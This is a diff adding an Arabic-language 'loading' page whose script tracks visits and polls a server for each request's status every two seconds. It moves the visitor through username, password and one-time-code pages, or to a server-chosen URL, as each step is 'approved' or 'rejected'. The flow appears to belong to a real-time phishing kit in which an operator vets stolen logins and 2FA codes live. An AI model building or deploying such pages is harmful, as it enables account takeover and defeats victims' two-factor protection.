@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحميل...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #ffffff;
+            font-family: Arial, sans-serif;
+        }
+        .loader-container {
+            text-align: center;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #006b4f;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        p {
+            color: #333;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader-container">
+        <div class="spinner"></div>
+        <p>جاري التحميل...</p>
+    </div>
+
+    <script>
+        // تتبع الزيارة
+        fetch('/track_visit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ action: 'track_visit', page: 'loading' })
+        }).catch(e => console.error(e));
+
+        function checkStatus() {
+            const requestId = new URLSearchParams(window.location.search).get('request_id') || localStorage.getItem("request_id");
+            if (!requestId) return;
+
+            fetch('/request_status/' + requestId)
+            .then(res => res.json())
+            .then(data => {
+                if (data.redirect_to) {
+                    window.location.href = data.redirect_to;
+                    return;
+                }
+                if (data.status === 'approved') {
+                    if (data.type === 'username') {
+                        window.location.href = 'password.html';
+                    } else if (data.type === 'password') {
+                        window.location.href = 'otp.html';
+                    } else if (data.type === 'otp') {
+                        window.location.href = 'success.html';
+                    }
+                } else if (data.status === 'rejected') {
+                    if (data.type === 'username') {
+                        window.location.href = 'login.html?rejected=true';
+                    } else if (data.type === 'password') {
+                        window.location.href = 'password.html?rejected=true';
+                    } else if (data.type === 'otp') {
+                        window.location.href = 'otp.html?rejected=true';
+                    }
+                }
+            })
+            .catch(e => console.error(e));
+        }
+
+        setInterval(checkStatus, 2000);
+    </script>
+</body>
+</html>
